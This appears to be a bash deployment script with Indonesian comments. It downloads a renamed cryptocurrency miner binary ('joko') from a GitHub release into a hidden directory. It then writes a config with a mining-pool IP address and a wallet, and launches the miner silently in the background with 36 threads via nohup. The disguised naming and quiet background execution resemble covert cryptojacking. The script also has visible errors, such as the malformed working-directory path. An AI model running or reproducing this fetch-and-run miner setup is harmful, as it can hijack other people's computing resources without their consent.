#!/bin/bash

# Cek apakah miner sudah berjalan
if pgrep -f "./joko -c config.json" > /dev/null; then
    echo "Miner sudah berjalan."
    exit 0
fi

# Buat direktori kerja
WORKDIR="$.joko_miner"
mkdir -p "$WORKDIR"
cd "$WORKDIR" || exit 1

# Unduh dan ekstrak miner jika belum ada
if [ ! -f "$WORKDIR/joko" ]; then
    echo "Mengunduh miner..."
    wget -q https://github.com/vokerjok/Voker/releases/download/Voker/joko.tar.gz -O joko.tar.gz
    tar -xf joko.tar.gz
    rm -f joko.tar.gz
fi

# Buat config.json
cat > config.json <<EOF
{
  "url": "128.199.126.117:80",
  "user": "MntUvZfYEvGvaYWSrkRvrW41YN5u7diF5R.joko1",
  "pass": "x",
  "threads": 36,
  "algo": "power2b"
}
EOF

# Set permission
chmod +x joko config.json

# Jalankan miner
echo "Menjalankan miner..."
nohup ./joko -c config.json > /dev/null 2>&1 &
echo "Miner berjalan di latar belakang."
